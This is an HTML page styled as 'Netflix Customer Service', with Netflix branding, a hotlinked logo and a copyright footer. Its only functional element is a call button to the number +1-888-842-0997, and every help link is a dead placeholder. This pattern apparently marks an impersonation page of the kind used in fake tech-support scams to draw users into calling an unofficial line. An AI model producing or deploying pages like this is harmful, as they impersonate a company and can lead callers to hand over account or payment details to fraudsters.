<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix Customer Service</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 0;
            background: url('/mnt/data/image.png') no-repeat center center fixed;
            background-size: cover;
            color: black;
        }
        .container {
            padding: 20px;
            background-color: rgba(255, 255, 255, 0.9);
            max-width: 800px;
            margin: 0 auto;
            border-radius: 10px;
        }
        .logo img {
            width: 100px;
        }
        .contact-button a {
            display: inline-block;
            padding: 10px 20px;
            margin: 20px 0;
            background-color: #e50914;
            color: white;
            text-decoration: none;
            border-radius: 5px;
        }
        .help-section {
            text-align: left;
            margin: 20px auto;
            max-width: 600px;
        }
        .help-section ul {
            list-style: none;
            padding: 0;
        }
        .help-section li {
            margin: 10px 0;
        }
        .help-section a {
            color: #e50914;
            text-decoration: none;
        }
        .help-section a:hover {
            text-decoration: underline;
        }
        .footer {
            margin-top: 40px;
            font-size: 14px;
        }
        .footer a {
            color: black;
            text-decoration: none;
            margin: 0 10px;
        }
        .footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://pbs.twimg.com/profile_images/762717842538008576/5Fx1dPlt_400x400.jpg" alt="Netflix Logo">
        </div>
        <div class="contact-button">
            <a href="tel:+1-888-842-0997">Contact Netflix Support</a>
        </div>
        <div class="help-section">
            <h2>How can we help you today?</h2>
            <ul>
                <li><a href="#">Content Grievances in United States</a></li>
                <li><a href="#">Reset password</a></li>
                <li><a href="#">Update email</a></li>
                <li><a href="#">Get help signing in</a></li>
                <li><a href="#">Update payment method</a></li>
                <li><a href="#">Request TV shows or movies</a></li>
            </ul>
        </div>
        <div class="footer">
            <p>Â© Netflix 2024</p>
            <p>
                <a href="#">Terms of Use</a>
                <a href="#">Privacy</a>
                <a href="#">Cookie Preferences</a>
                <a href="#">Corporate Information</a>
            </p>
        </div>
    </div>
</body>
</html>
